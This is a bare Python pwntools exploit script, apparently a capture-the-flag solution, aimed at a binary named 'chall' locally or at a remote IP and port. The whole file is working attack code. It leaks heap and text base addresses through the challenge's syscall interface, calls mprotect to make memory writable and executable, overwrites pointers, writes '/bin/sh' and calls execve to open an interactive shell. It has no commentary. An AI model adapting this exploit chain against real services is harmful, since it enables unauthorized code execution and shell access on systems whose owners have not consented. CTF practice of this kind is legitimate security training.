#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('13.231.207.73', 9006)

def syscall(num, arg1=0, arg2=0, arg3=0):
    s.sendlineafter('syscall: ', str(num))
    s.sendlineafter('arg1: ', str(arg1))
    s.sendlineafter('arg2: ', str(arg2))
    s.sendlineafter('arg3: ', str(arg3))

syscall(0xc)
s.recvuntil('retval: ')
heap_base = int(s.recvline(False), 0x10) - 0x21000
log.info('heap base: %#x' % heap_base)

syscall(0x14, 1, heap_base + 0x11e70, 1)
s.recvuntil('=\n')
text_base = u64(s.recv(8)) - 0x1114
log.info('text base: %#x' % text_base)

syscall(0xa, text_base + 0x202000, 0x1000, 7)
syscall(0x13, 0, heap_base + 0x11e70, 1)
s.sendafter('=\n', p64(text_base + 0x1114) + p64(text_base + 0x1290))

syscall(0, 0, heap_base, 8)
s.sendafter('=\n', '/bin/sh\0')

syscall(0x3b, heap_base, 0, 0)
s.interactive()
